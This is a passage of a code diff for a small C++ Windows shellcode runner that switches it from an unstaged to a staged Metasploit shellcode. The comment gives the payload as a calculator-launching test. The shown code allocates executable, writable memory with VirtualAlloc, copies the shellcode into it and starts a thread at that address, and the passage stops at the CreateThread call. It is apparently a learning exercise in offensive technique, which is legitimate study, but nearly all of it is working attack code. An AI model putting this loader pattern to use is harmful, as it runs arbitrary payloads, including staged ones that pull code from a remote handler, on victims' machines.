@@ -1,13 +1,13 @@
 // This program's goal is to try to create a new process to execute a shellcode that will open a calculator
 
-#include <Windows.h>
-#include "unstaged_shellcode.hpp"
+#include <windows.h>
+#include "staged_shellcode.hpp"
 
 int main()
 {
 	// Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
-								sizeof(metasploit_unstaged_shellcode),
+								sizeof(metasploit_staged_shellcode),
 								MEM_COMMIT,
 								PAGE_EXECUTE_READWRITE);
 
@@ -18,8 +18,8 @@ int main()
 
 	// Move the shellcode to the allocated memory
 	memcpy(memory,
-		   metasploit_unstaged_shellcode,
-		   sizeof(metasploit_unstaged_shellcode));
+		   metasploit_staged_shellcode,
+		   sizeof(metasploit_staged_shellcode));
 
 	// Create a thread pointing to the shellcode address
 	HANDLE thread =	CreateThread(nullptr,
